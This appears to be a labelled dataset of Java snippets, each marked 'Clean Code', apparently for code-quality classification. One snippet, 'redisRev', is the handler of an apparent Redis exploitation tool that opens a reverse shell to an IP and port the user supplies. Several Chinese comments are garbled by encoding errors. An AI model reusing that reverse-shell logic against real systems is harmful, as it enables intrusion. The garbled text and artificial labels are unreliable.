 * @return
 */
public String getValue(){
  return this.value;
}
/** 
 * 鑾峰彇鎸囧畾 {@linkplain Locale}鐨勬爣绛惧�笺�� <p> 濡傛灉娌℃湁鍖归厤鐨勶紝灏嗚繑鍥炵┖瀛楃涓瞷@code """"}銆� </p>
 * @param locale 鍏佽涓簕@code null}
 * @return
 */
public String getValue(Locale locale){
  String value=null;
  if (this.localeValues == null || this.localeValues.isEmpty() || locale == null) {
    value=this.value;
  }
 else {
    List<String> keys=getPriorityStringList(locale);
    for (    String key : keys) {
      value=this.localeValues.get(key);
      if (value != null)       break;
    }
  }
  if (value == null)   value=this.value;
  if (value == null)   value="""";
  return value;
}
",0,Clean Code
"public static void showBulletinError(TLRPC.TL_error error){
  BulletinFactory bulletinFactory=BulletinFactory.global();
  if (bulletinFactory == null || error == null || error.text == null) {
    return;
  }
  bulletinFactory.createErrorBulletin(error.text).show();
}
",0,Clean Code
"/** 
 * Needs to be used in  {@link TickEvent.Pre}
 */
public static boolean breakBlock(BlockPos blockPos,boolean swing){
  if (!canBreak(blockPos,mc.world.getBlockState(blockPos)))   return false;
  BlockPos pos=blockPos instanceof BlockPos.Mutable ? new BlockPos(blockPos) : blockPos;
  InstaMine im=Modules.get().get(InstaMine.class);
  if (im != null && im.isActive() && im.blockPos.equals(pos) && im.shouldMine()) {
    im.sendPacket();
    return true;
  }
  if (mc.interactionManager.isBreakingBlock())   mc.interactionManager.updateBlockBreakingProgress(pos,getDirection(blockPos));
 else   mc.interactionManager.attackBlock(pos,getDirection(blockPos));
  if (swing)   mc.player.swingHand(Hand.MAIN_HAND);
 else   mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
  breaking=true;
  breakingThisTick=true;
  return true;
}",0,Clean Code
"/** 
 * Actually runs a tracker update. Called from the  {@link #manager}'s update scheduler.
 */
protected void doUpdate(){
  if (this.closed) {
    return;
  }
{
    STATE lastState=this.lastState;
    STATE nextState=this.nextState;
    if (nextState != null && (lastState == null || this.shouldTriggerUpdate(lastState,nextState))) {
      this.lastState=nextState;
      this.nextState=null;
      this.pauseQueue();
      this.clearWaiting();
      try (SimpleSet<POS> untrackingPositions=this.mode.directPosAccess().newPositionSet()){
        this.updateState(lastState,nextState,untrackingPositions);
        untrackingPositions.forEach(pos -> this.manager.stopTracking(this,pos));
      }
       checkState(this.waitingPositions.isEmpty(),""load queue isn't empty?!? %s"",this.waitingPositions);
      this.unpauseQueue();
    }
  }
  this.updateWaiting();
}
",0,Clean Code
"public void createLinkAsync(String linkName,String targetFile){
  if (linkName == null || linkName.isBlank() || targetFile == null || targetFile.isBlank()) {
    return;
  }
  ThreadHelper.runFailableAsync(() -> {
    BooleanScope.execute(busy,() -> {
      if (fileSystem == null) {
        return;
      }
      if (getCurrentDirectory() == null) {
        return;
      }
      startIfNeeded();
      var abs=FileNames.join(getCurrentDirectory().getPath(),linkName);
      fileSystem.symbolicLink(abs,targetFile);
      refreshSync();
    }
);
  }
);
}
",0,Clean Code
"public static GetPlayerBoardDataScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new GetPlayerBoardDataScRsp(),data).checkInitialized();
}
public static GetPlayerBoardDataScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetPlayerBoardDataScRsp(),input).checkInitialized();
}
public static GetPlayerBoardDataScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetPlayerBoardDataScRsp(),input).checkInitialized();
}
",0,Clean Code
"@Override public PageResult<DataSourceAccess> comprehensivePageQuery(DataSourceAccessComprehensivePageQueryParam param,DataSourceAccessSelector selector){
  Page<DataSourceAccessDO> page=new Page<>(param.getPageNo(),param.getPageSize());
  page.setSearchCount(param.getEnableReturnCount());
  IPage<DataSourceAccessDO> iPage=getMapper().comprehensivePageQuery(page,param.getDataSourceId(),param.getAccessObjectType(),param.getAccessObjectId(),param.getUserOrTeamSearchKey(),param.getDataSourceSearchKey());
  List<DataSourceAccess> list=dataSourceAccessConverter.do2dto(iPage.getRecords());
  fillData(list,selector);
  return PageResult.of(list,iPage.getTotal(),param);
}",0,Clean Code
"public EagerThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,TaskQueue<Runnable> workQueue,ThreadFactory threadFactory,RejectedExecutionHandler handler){
  super(corePoolSize,maximumPoolSize,keepAliveTime,unit,workQueue,threadFactory,handler);
}
",0,Clean Code
"static boolean hasAnswer(GenerationResult result){
  return Optional.of(result).map(GenerationResult::getOutput).map(GenerationOutput::getChoices).filter(choices -> !choices.isEmpty()).isPresent();
}
static boolean hasAnswer(MultiModalConversationResult result){
  return Optional.of(result).map(MultiModalConversationResult::getOutput).map(MultiModalConversationOutput::getChoices).filter(choices -> !choices.isEmpty()).map(choices -> choices.get(0)).map(MultiModalConversationOutput.Choice::getMessage).map(MultiModalMessage::getContent).filter(contents -> !contents.isEmpty()).isPresent();
}",0,Clean Code
"private int getMask(){
  int mask=0;
  if (lastReturnedNum < searchResultMessages.size() - 1 || !messagesSearchEndReached[0] || !messagesSearchEndReached[1]) {
    mask|=1;
  }
  if (lastReturnedNum > 0) {
    mask|=2;
  }
  return mask;
}",0,Clean Code
"/** 
 * Measures the dimension of this view and its children by taking system insets, navigation bar, status bar, into account.
 */
protected void doMeasure(int widthMeasureSpec,int heightMeasureSpec){
  DeviceProfile deviceProfile=mActivityContext.getDeviceProfile();
  int widthUsed;
  if (deviceProfile.isTablet) {
    int margin=deviceProfile.allAppsLeftRightMargin;
    if (deviceProfile.isLandscape && LARGE_SCREEN_WIDGET_PICKER.get() && !deviceProfile.isTwoPanels) {
      margin=getResources().getDimensionPixelSize(R.dimen.widget_picker_landscape_tablet_left_right_margin);
    }
    widthUsed=Math.max(2 * margin,2 * (mInsets.left + mInsets.right));
  }
 else   if (mInsets.bottom > 0) {
    widthUsed=mInsets.left + mInsets.right;
  }
 else {
    Rect padding=deviceProfile.workspacePadding;
    widthUsed=Math.max(padding.left + padding.right,2 * (mInsets.left + mInsets.right));
  }
  measureChildWithMargins(mContent,widthMeasureSpec,widthUsed,heightMeasureSpec,deviceProfile.bottomSheetTopPadding);
  setMeasuredDimension(MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.getSize(heightMeasureSpec));
}",0,Clean Code
"private static void before() throws IOException {
  SqlSessionFactoryBuilder builder=new SqlSessionFactoryBuilder();
  MybatisConfiguration configuration=new MybatisConfiguration();
  initConfiguration(configuration);
  configuration.addInterceptor(initInterceptor());
  configuration.setLogImpl(Slf4jImpl.class);
  configuration.addMappers(""ai.chat2db.server.domain.repository.mapper"");
  GlobalConfig globalConfig=GlobalConfigUtils.getGlobalConfig(configuration);
  globalConfig.setSqlInjector(new DefaultSqlInjector());
  globalConfig.setIdentifierGenerator(new DefaultIdentifierGenerator());
  globalConfig.setSuperMapperClass(BaseMapper.class);
  DataSource dataSource=initDataSource();
  Environment environment=new Environment(""1"",new JdbcTransactionFactory(),dataSource);
  configuration.setEnvironment(environment);
  registryMapperXml(configuration,""mapper"");
  sqlSessionFactory=builder.build(configuration);
  initFlyway(dataSource);
}",0,Clean Code
"@Override public void render(GuiGraphics graphics,int mouseX,int mouseY,float delta){
  String name=this.option.getName().getString();
  String label;
  if ((this.hovered || this.isFocused()) && this.font.width(name) > (this.dim.width() - this.option.getControl().getMaxWidth())) {
    name=name.substring(0,Math.min(name.length(),10)) + ""..."";
  }
  if (this.option.isAvailable()) {
    if (this.option.hasChanged()) {
      label=ChatFormatting.ITALIC + name + "" *"";
    }
 else {
      label=ChatFormatting.WHITE + name;
    }
  }
 else {
    label=String.valueOf(ChatFormatting.GRAY) + ChatFormatting.STRIKETHROUGH + name;
  }
  this.hovered=this.dim.containsCursor(mouseX,mouseY);
  this.drawRect(graphics,this.dim.x(),this.dim.y(),this.dim.getLimitX(),this.dim.getLimitY(),this.hovered ? 0xE0000000 : 0x90000000);
  this.drawString(graphics,label,this.dim.x() + 6,this.dim.getCenterY() - 4,0xFFFFFFFF);
  if (this.isFocused()) {
    this.drawBorder(graphics,this.dim.x(),this.dim.y(),this.dim.getLimitX(),this.dim.getLimitY(),-1);
  }
}",0,Clean Code
"/** 
 * Fetch execution logs for a task.
 * @param taskId id of the task.
 */
public List<TaskExecLog> getTaskLogs(String taskId){
  Validate.notBlank(taskId,""Task id cannot be blank"");
  return getForEntity(""tasks/{taskId}/log"",null,taskExecLogList,taskId);
}
",0,Clean Code
"public void drawOutline(Canvas canvas,boolean after,float width,float alpha){
  if (outlineBoundsPath == null)   return;
  canvas.save();
  canvas.clipPath(outlineBoundsPath);
  if (sourceBitmap != null) {
    Paint paint=after ? bordersStrokePaint : bordersFillPaint;
    paint.setAlpha((int)(0xFF * alpha));
    paint.setStrokeWidth(dp(width));
    canvas.drawPath(segmentBorderPath,paint);
    if (outlineBoundsPath != null && after) {
      canvas.clipPath(segmentBorderPath);
      paint.setStrokeWidth(dp(2 * width));
      canvas.drawPath(outlineBoundsPath,paint);
    }
  }
  canvas.restore();
}
public void drawOutline(Canvas canvas,boolean after,ViewGroup parent,boolean hide){
  this.outlineAlpha.setParent(parent);
  if (!outlineVisible && this.outlineAlpha.get() <= 0) {
    return;
  }
  final float outlineAlpha=parent == null ? 1f : this.outlineAlpha.set(outlineVisible && !hide);
  if (objects != null) {
    for (    SegmentedObject object : objects) {
      if (object != null && object == selectedObject && outlineWidth > 0) {
        object.drawOutline(canvas,after,outlineWidth,outlineAlpha);
        break;
      }
    }
  }
}",0,Clean Code
"public static String generateT2CJsonFromGraphXml(String graphXml,String path,Logger logger,String packageName,String deviceType) throws Exception {
  if (graphXml == null || graphXml.isEmpty() || path == null || path.isEmpty()) {
    return null;
  }
  String[] nodes=path.split("","");
  if (nodes.length < 2) {
    logger.error(""Graph path ["" + path + ""] is not valid"");
    return null;
  }
  List<String> elementStrList=new ArrayList<>();
  for (int i=0; i < nodes.length - 1; i++) {
    String source=nodes[i];
    String target=nodes[i + 1];
    elementStrList.add(extract(graphXml,source,target));
  }
  return exportT2CJsonForAndroid(elementStrList,packageName);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)88);
    output.writeUInt32NoTag(propEntityId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.propState,propState);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.propEntityId,propEntityId);
  }
  output.endObject();
}",0,Clean Code
"void getSourceOfReplyMsg(@Nullable Contact contact,long j2,long j3,@Nullable IMsgOperateCallback iMsgOperateCallback);",0,Clean Code
"@Override public void execute(final CEdgeHoverState state,final MouseEvent event){
}
",0,Clean Code
"public String toString(){
  return ""GProHotSearchWord{type="" + this.type + "",word=""+ this.word+ "",icon=""+ this.icon+ "",link=""+ this.link+ "",}"";
}
",0,Clean Code
"/** 
 * Deserialize <code>obj</code> from a byte array. 
 */
Object deserialize(byte[] bytes);
Object deserialize(byte[] bytes,Iterable<MemoryBuffer> outOfBandBuffers);
/** 
 * Deserialize <code>obj</code> from a off-heap buffer specified by <code>address</code> and <code>size</code>.
 */
Object deserialize(long address,int size);
/** 
 * Deserialize <code>obj</code> from a <code>buffer</code>. 
 */
Object deserialize(MemoryBuffer buffer);
Object deserialize(MemoryBuffer buffer,Iterable<MemoryBuffer> outOfBandBuffers);
Object deserialize(FuryInputStream inputStream);
Object deserialize(FuryInputStream inputStream,Iterable<MemoryBuffer> outOfBandBuffers);
Object deserialize(FuryReadableChannel channel);
Object deserialize(FuryReadableChannel channel,Iterable<MemoryBuffer> outOfBandBuffers);
",0,Clean Code
"public static int tableSize(int capacity,float loadFactor){
  if (capacity < 0) {
    throw new IllegalArgumentException(""capacity must be >= 0: "" + capacity);
  }
  int tableSize=nextPowerOfTwo(Math.max(2,(int)Math.ceil(capacity / loadFactor)));
  if (tableSize > 1 << 30) {
    throw new IllegalArgumentException(""The required capacity is too large: "" + capacity);
  }
  return tableSize;
}",0,Clean Code
"public static boolean isAbsolute(String file){
  if (!file.contains(""/"") && !file.contains(""\\"")) {
    return false;
  }
  if (!file.startsWith(""\\"") && !file.startsWith(""/"") && !file.startsWith(""~"")&& !file.matches(""^\\w:.*"")) {
    return false;
  }
  return true;
}
",0,Clean Code
"@Override public void onNewStmt(Stmt stmt,JMethod container){
  super.onNewStmt(stmt,container);
  if (stmt instanceof Cast) {
    CastExp castExp=cast.getRValue();
    Var rhs=castExp.getValue();
    if (castExp.getCastType() instanceof ClassType && (!ONLY_APP || (rhs.getMethod().isApplication() && type.getJClass().isApplication()))) {
      casts.put(rhs,type);
    }
  }
}
",0,Clean Code
"private void setFiatAmount(CurrencyRate currencyRate,Long amount){
  if (amount != null && currencyRate != null && currencyRate.isAvailable()) {
    fiatAmount.set(currencyRate,amount);
  }
}
",0,Clean Code
"/** 
 * <code>repeated .SceneEntityInfo entity_list = 10;</code>
 * @param value the entityList to add
 * @return this
 */
public SceneInfo addEntityList(final SceneEntityInfoOuterClass.SceneEntityInfo value){
  bitField0_|=0x00000200;
  entityList.add(value);
  return this;
}",0,Clean Code
"String getTinyId();
",0,Clean Code
"private static Map<String,String> getPropertiesInUse(Xml.Document pomXml,ExecutionContext ctx){
  Map<String,String> properties=new HashMap<>();
  new MavenIsoVisitor<ExecutionContext>(){
    @Nullable ResolvedPom resolvedPom=null;
    @Override public Xml.Tag visitTag(    Xml.Tag tag,    ExecutionContext ctx){
      Xml.Tag t=super.visitTag(tag,ctx);
      if (t.getContent() != null && t.getContent().size() == 1 && t.getContent().get(0) instanceof Xml.CharData) {
        String text=((Xml.CharData)t.getContent().get(0)).getText().trim();
        Matcher m=PROPERTY_PATTERN.matcher(text);
        while (m.find()) {
          if (resolvedPom == null) {
            resolvedPom=getResolutionResult().getPom();
          }
          String propertyName=m.group(1).trim();
          if (resolvedPom.getProperties().containsKey(propertyName)) {
            properties.put(m.group(1).trim(),resolvedPom.getProperties().get(propertyName));
          }
        }
      }
      return t;
    }
  }
.visit(pomXml,ctx);
  return properties;
}",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (checkBoxType == 2 && (isChecked || checkProgress > 0.0f)) {
    paint.setColor(Theme.getColor(Theme.key_checkboxSquareBackground));
    float cx=avatarImageView.getLeft() + avatarImageView.getMeasuredWidth() / 2;
    float cy=avatarImageView.getTop() + avatarImageView.getMeasuredHeight() / 2;
    canvas.drawCircle(cx,cy,AndroidUtilities.dp(18) + AndroidUtilities.dp(4) * checkProgress,paint);
  }
  if (drawDivider) {
    int start=AndroidUtilities.dp(LocaleController.isRTL ? 0 : 72 + padding);
    int end=getMeasuredWidth() - AndroidUtilities.dp(!LocaleController.isRTL ? 0 : 72 + padding);
    if (forceDarkTheme) {
      Theme.dividerExtraPaint.setColor(Theme.getColor(Theme.key_voipgroup_actionBar));
      canvas.drawRect(start,getMeasuredHeight() - 1,end,getMeasuredHeight(),Theme.dividerExtraPaint);
    }
 else {
      canvas.drawRect(start,getMeasuredHeight() - 1,end,getMeasuredHeight(),Theme.dividerPaint);
    }
  }
}",0,Clean Code
"SwipeListenerHorizontal(Object cellLayout){
  helperContext=((ViewGroup)cellLayout).getContext();
  float density=helperContext.getResources().getDisplayMetrics().density;
  SWIPE_MIN_DISTANCE_HORIZ=Math.round(75 * density);
  SWIPE_THRESHOLD_VELOCITY=Math.round(33 * density);
}",0,Clean Code
"@Override public Integer getTopK(){
  return this.topK;
}
",0,Clean Code
"/** 
 * 鏌ヨ鐧婚檰鐢ㄦ埛鏄惁鍦ㄤ汉璧勫憳宸ヤ腑
 * @param
 * @return
 */
@PostMapping(""/hrmEmployee/queryIsInHrm"") @ApiOperation(""鏌ヨ鐧婚檰鐢ㄦ埛鏄惁鍦ㄤ汉璧勫憳宸ヤ腑"") public Result<Boolean> queryIsInHrm();
",0,Clean Code
"@Test public void testPendingByCorrelationId(){
  WorkflowDef def=new WorkflowDef();
  def.setName(""pending_count_correlation_jtest"");
  WorkflowModel workflow=createTestWorkflow();
  workflow.setWorkflowDefinition(def);
  generateWorkflows(workflow,10);
  List<WorkflowModel> bycorrelationId=getExecutionDAO().getWorkflowsByCorrelationId(""pending_count_correlation_jtest"",""corr001"",true);
  assertNotNull(bycorrelationId);
  assertEquals(10,bycorrelationId.size());
}",0,Clean Code
"/** 
 * 鍙嶅脊shell
 */
@FXML void redisRev(ActionEvent event){
  Runnable runner=() -> {
    String revIp=this.redisRevIPTextField.getText();
    String revPort=redisRevPortTextField.getText();
    if (revIp == null || revIp.isEmpty() || revPort == null || revPort.isEmpty()) {
      Platform.runLater(() -> {
        MessageUtil.showErrorMessage(""璇疯ˉ鍏ㄥ弽寮圭殑ip鍦板潃鎴栫鍙�"");
      }
);
      return;
    }
    Platform.runLater(() -> {
      redisLogTextFArea.appendText(Utils.log(""姝ｅ湪灏濊瘯鍙嶅脊鍒�: "" + revIp + "":""+ revPort+ "" 璇风◢绛�,娉ㄦ剰鏌ョ湅vps""));
    }
);
    String result=this.redisDao.revShell(revIp,revPort);
    Platform.runLater(() -> {
      redisOutputTextFArea.setText(result);
    }
);
  }
;
  Thread workThread=new Thread(runner);
  workThread.start();
}
",0,Clean Code
"public static GetMissionStatusScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new GetMissionStatusScRsp(),data).checkInitialized();
}
public static GetMissionStatusScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetMissionStatusScRsp(),input).checkInitialized();
}
public static GetMissionStatusScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new GetMissionStatusScRsp(),input).checkInitialized();
}
",0,Clean Code
"private static void friendWatchNewWeek(){
  JSONObject joSingle;
  try {
    String dateStr=TimeUtil.getDateStr();
    List<String> friendIds=FriendIdMap.getFriendIds();
    for (    String id : friendIds) {
      if (joFriendWatch.has(id)) {
        joSingle=joFriendWatch.getJSONObject(id);
      }
 else {
        joSingle=new JSONObject();
      }
      joSingle.put(""name"",FriendIdMap.getNameById(id));
      joSingle.put(""allGet"",joSingle.optInt(""allGet"",0) + joSingle.optInt(""weekGet"",0));
      joSingle.put(""weekGet"",0);
      if (!joSingle.has(""startTime"")) {
        joSingle.put(""startTime"",dateStr);
      }
      joFriendWatch.put(id,joSingle);
    }
    FileUtils.write2File(joFriendWatch.toString(),FileUtils.getFriendWatchFile());
  }
 catch (  Throwable th) {
    Log.i(TAG,""friendWatchNewWeek err:"");
    Log.printStackTrace(TAG,th);
  }
}",0,Clean Code
"public void addSourceInfo(String sourceIp,String sourcePort,String rptSrcType,String protocolType){
  if (StringUtils.isEmpty(sourceIp) || StringUtils.isEmpty(sourcePort) || StringUtils.isEmpty(rptSrcType)|| StringUtils.isEmpty(protocolType)) {
    LOG.warn(""[Source Report Holder] found empty parameter!, add values is {}, {}, {}, {}"",sourceIp,sourcePort,rptSrcType,protocolType);
    return;
  }
  String recordKey=sourceIp + ""#"" + sourcePort+ ""#""+ protocolType;
  this.srcAddressMap.put(recordKey,new AddressInfo(sourceIp,sourcePort,rptSrcType,protocolType));
}
",0,Clean Code
"/** 
 * <code>repeated uint32 lighten_section_list = 9;</code>
 * @return this
 */
public GetSceneMapInfoScRsp clearLightenSectionList(){
  bitField0_&=~0x00000010;
  lightenSectionList.clear();
  return this;
}",0,Clean Code
"@Override public SetDisplayAvatarCsReq clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  displayAvatarList.clearQuick();
  return this;
}",0,Clean Code
"public int getServiceType(){
  return this.serviceType;
}
",0,Clean Code
"public ArrayList<SearchRspGroupInfo> getGroupInfos(){
  return this.groupInfos;
}
",0,Clean Code
"protected void handleMoveEvent(int x,int y){
  mDragObject.dragView.move(x,y);
  final int[] coordinates=mCoordinatesTemp;
  DropTarget dropTarget=findDropTarget(x,y,coordinates);
  mDragObject.x=coordinates[0];
  mDragObject.y=coordinates[1];
  checkTouchMove(dropTarget);
  mDistanceSinceScroll+=Math.hypot(mLastTouch.x - x,mLastTouch.y - y);
  mLastTouch.set(x,y);
  int distanceDragged=mDistanceSinceScroll;
  if (ATLEAST_Q && mLastTouchClassification == MotionEvent.CLASSIFICATION_DEEP_PRESS) {
    distanceDragged/=DEEP_PRESS_DISTANCE_FACTOR;
  }
  if (mIsInPreDrag && mOptions.preDragCondition != null && mOptions.preDragCondition.shouldStartDrag(distanceDragged)) {
    callOnDragStart();
  }
}",0,Clean Code
"/** 
 * Create a new MockMultipartFile with the given content.
 * @param name             the name of the file
 * @param originalFilename the original filename (as on the client's machine)
 * @param contentType      the content type (if known)
 * @param bytes            the content of the file
 */
public MockMultipartFile(String name,String originalFilename,String contentType,byte[] bytes){
  Assert.hasLength(name,""Name must not be null"");
  this.name=name;
  this.originalFilename=(originalFilename != null ? originalFilename : """");
  this.contentType=contentType;
  if (bytes == null) {
    bytes=new byte[0];
  }
  this.content=bytes;
}",0,Clean Code
"/** 
 * Generate token by API.<br/> Ref: <a href=""https://open.feishu.cn/document/ukTMukTMukTM/uADN14CM0UjLwQTN?lang=en-US"">Custom applications get app_access_token</a>
 */
public static void refreshToken(){
  LOG.info(""Start to generate or refresh app_access_token..."");
  Map<String,Object> body=Maps.newHashMap();
  body.put(""app_id"",SheetConfig.APP_ID);
  body.put(""app_secret"",SheetConfig.APP_SECRET);
  AppAccessTokenResponse response;
  try {
    response=(AppAccessTokenResponse)RETRYER.call(() -> {
      HttpManager.WrappedResponse wrappedResponse;
      String url=SheetConfig.OPEN_API_HOST + SheetConfig.APP_ACCESS_TOKEN_API;
      wrappedResponse=HttpManager.sendPost(url,null,body,ContentType.APPLICATION_JSON);
      AppAccessTokenResponse tmpResponse=FastJsonUtil.parseObject(wrappedResponse.getResult(),AppAccessTokenResponse.class);
      if (tmpResponse.isFlowLimited()) {
        LOG.info(""trigger flow control when generate app_access_token, maybe retry later..."");
      }
      return tmpResponse;
    }
);
  }
 catch (  ExecutionException|RetryException e) {
    throw new RuntimeException(String.format(""Error while get app_access_token from lark open api, caused by: %s"",e.getCause().getMessage()),e.getCause());
  }
  if (response == null || response.isFailed() || StringUtils.isBlank(response.getAppAccessToken())) {
    throw new RuntimeException(String.format(""generate app_access_token from lark open api failed."" + "" please check your app_id and app_secret, response is :%s"",response));
  }
  appAccessToken=response.getAppAccessToken();
  generateTokenByApi=true;
  LOG.info(""Successfully generate or refresh app_access_token!"");
}",0,Clean Code
"private void createSyncObjects(){
  imageAvailableSemaphores=new ArrayList<>(framesNum);
  renderFinishedSemaphores=new ArrayList<>(framesNum);
  inFlightFences=new ArrayList<>(framesNum);
  try (MemoryStack stack=stackPush()){
    VkSemaphoreCreateInfo semaphoreInfo=VkSemaphoreCreateInfo.calloc(stack);
    semaphoreInfo.sType(VK_STRUCTURE_TYPE_SEMAPHORE_CREATE_INFO);
    VkFenceCreateInfo fenceInfo=VkFenceCreateInfo.calloc(stack);
    fenceInfo.sType(VK_STRUCTURE_TYPE_FENCE_CREATE_INFO);
    fenceInfo.flags(VK_FENCE_CREATE_SIGNALED_BIT);
    LongBuffer pImageAvailableSemaphore=stack.mallocLong(1);
    LongBuffer pRenderFinishedSemaphore=stack.mallocLong(1);
    LongBuffer pFence=stack.mallocLong(1);
    for (int i=0; i < framesNum; i++) {
      if (vkCreateSemaphore(device,semaphoreInfo,null,pImageAvailableSemaphore) != VK_SUCCESS || vkCreateSemaphore(device,semaphoreInfo,null,pRenderFinishedSemaphore) != VK_SUCCESS || vkCreateFence(device,fenceInfo,null,pFence) != VK_SUCCESS) {
        throw new RuntimeException(""Failed to create synchronization objects for the frame "" + i);
      }
      imageAvailableSemaphores.add(pImageAvailableSemaphore.get(0));
      renderFinishedSemaphores.add(pRenderFinishedSemaphore.get(0));
      inFlightFences.add(pFence.get(0));
    }
  }
 }",0,Clean Code
"public static void main(String[] args){
  HessionUserTypeState userTypeState=new HessionUserTypeState();
  userTypeState.objectType=ObjectType.STRUCT;
  userTypeState.setup();
}
",0,Clean Code
"/** 
 * <code>optional .ChessRogueNousDice nous_dice = 6;</code>
 * @param value the nousDice to set
 * @return this
 */
public ChessRogueRollDiceScRsp setNousDice(final ChessRogueNousDiceOuterClass.ChessRogueNousDice value){
  bitField0_|=0x00000004;
  nousDice.copyFrom(value);
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 times = 7;</code>
 * @return whether the times field is set
 */
public boolean hasTimes(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public String getDesc5(){
  return this.desc5;
}",0,Clean Code
"/** 
 * Creates an array of indices that determine which physical fields of the table schema to include in the key format and the order that those fields have in the key format. <p>See {KafkaConnectorOptions#KEY_FORMAT}, { KafkaConnectorOptions#KEY_FIELDS}, and {KafkaConnectorOptions#KEY_FIELDS_PREFIX} for more information.
 */
public static int[] createKeyFormatProjection(ReadableConfig options,DataType physicalDataType){
  final LogicalType physicalType=physicalDataType.getLogicalType();
  Preconditions.checkArgument(physicalType.is(LogicalTypeRoot.ROW),""Row data type expected."");
  final Optional<String> optionalKeyFormat=options.getOptional(KEY_FORMAT);
  final Optional<List<String>> optionalKeyFields=options.getOptional(KEY_FIELDS);
  if (!optionalKeyFormat.isPresent() && optionalKeyFields.isPresent()) {
    throw new ValidationException(String.format(""The option '%s' can only be declared if a key format is defined using '%s'."",KEY_FIELDS.key(),KEY_FORMAT.key()));
  }
 else   if (optionalKeyFormat.isPresent() && (!optionalKeyFields.isPresent() || optionalKeyFields.get().size() == 0)) {
    throw new ValidationException(String.format(""A key format '%s' requires the declaration of one or more of key fields using '%s'."",KEY_FORMAT.key(),KEY_FIELDS.key()));
  }
  if (!optionalKeyFormat.isPresent()) {
    return new int[0];
  }
  final String keyPrefix=options.getOptional(KEY_FIELDS_PREFIX).orElse("""");
  final List<String> keyFields=optionalKeyFields.get();
  final List<String> physicalFields=LogicalTypeChecks.getFieldNames(physicalType);
  return keyFields.stream().mapToInt(keyField -> {
    final int pos=physicalFields.indexOf(keyField);
    if (pos < 0) {
      throw new ValidationException(String.format(""Could not find the field '%s' in the table schema for usage in the key format. "" + ""A key field must be a regular, physical column. "" + ""The following columns can be selected in the '%s' option:\n""+ ""%s"",keyField,KEY_FIELDS.key(),physicalFields));
    }
    if (!keyField.startsWith(keyPrefix)) {
      throw new ValidationException(String.format(""All fields in '%s' must be prefixed with '%s' when option '%s' "" + ""is set but field '%s' is not prefixed."",KEY_FIELDS.key(),keyPrefix,KEY_FIELDS_PREFIX.key(),keyField));
    }
    return pos;
  }
).toArray();
}",0,Clean Code
"@Override public Long getRequestsLimit(){
  return this.requestsLimit;
}
",0,Clean Code
"@Override public String getGuildName(){
  return this.mInfo.getGuildName();
}
",0,Clean Code
"/** 
 * Suspends stream reader until updated stream split join again. 
 */
private void suspendStreamReaderIfNeed() throws Exception {
  if (currentFetcher != null && currentFetcher instanceof IncrementalSourceStreamFetcher && context.isStreamSplitReaderSuspended() && !currentFetcher.isFinished()) {
    ((IncrementalSourceStreamFetcher)currentFetcher).stopReadTask();
    LOG.info(""Suspend stream reader to wait the stream split update."");
  }
}
",0,Clean Code
"private void initView(){
  searchConfiguration.setSearchBarEnabled(false);
  setOnQueryTextListener(new OnQueryTextListener(){
    @Override public boolean onQueryTextSubmit(    String query){
      return false;
    }
    @Override public boolean onQueryTextChange(    String newText){
      if (searchFragment != null) {
        searchFragment.setSearchTerm(newText);
      }
      return true;
    }
  }
);
  setOnQueryTextFocusChangeListener((v,hasFocus) -> {
    if (hasFocus && (searchFragment == null || !searchFragment.isVisible())) {
      searchFragment=searchConfiguration.showSearchFragment();
      searchFragment.setHistoryClickListener(entry -> setQuery(entry,false));
    }
  }
);
}
",0,Clean Code
"private void installCompleted(int sessionId,int finalStatus,@Nullable String blockingPackage,@Nullable String statusMessage){
  ThreadUtils.ensureWorkerThread();
  if (finalStatus == STATUS_FAILURE_ABORTED && mSessionId == sessionId && mOnInstallListener != null && !SelfPermissions.checkSelfPermission(Manifest.permission.INSTALL_PACKAGES) && MiuiUtils.isActualMiuiVersionAtLeast(""12.5"",""20.2.0"") && Objects.equals(statusMessage,""INSTALL_FAILED_ABORTED: Permission denied"") && mAttempts <= 3) {
    ++mAttempts;
    Log.i(TAG,""MIUI: Installation attempt no %d for package %s"",mAttempts,mPackageName);
    mInteractionWatcher.countDown();
    mInstallWatcher.countDown();
    unregisterReceiver();
    mOnInstallListener.onAnotherAttemptInMiui(mApkFile);
    return;
  }
  if (finalStatus == STATUS_FAILURE_SESSION_CREATE || (mSessionId == sessionId)) {
    if (mOnInstallListener != null) {
      mOnInstallListener.onFinishedInstall(sessionId,mPackageName,finalStatus,blockingPackage,statusMessage);
    }
    if (mCloseApkFile && mApkFile != null) {
      mApkFile.close();
    }
    mInteractionWatcher.countDown();
    mInstallWatcher.countDown();
  }
}",0,Clean Code
"static int countVersionParts(String version){
  int count=0;
  int len=version.length();
  int lastSepIdx=-1;
  for (int i=0; i < len; i++) {
    char c=version.charAt(i);
    if (c == '.' || c == '-' || c == '$') {
      if (lastSepIdx == i - 1) {
        return count;
      }
      lastSepIdx=i;
    }
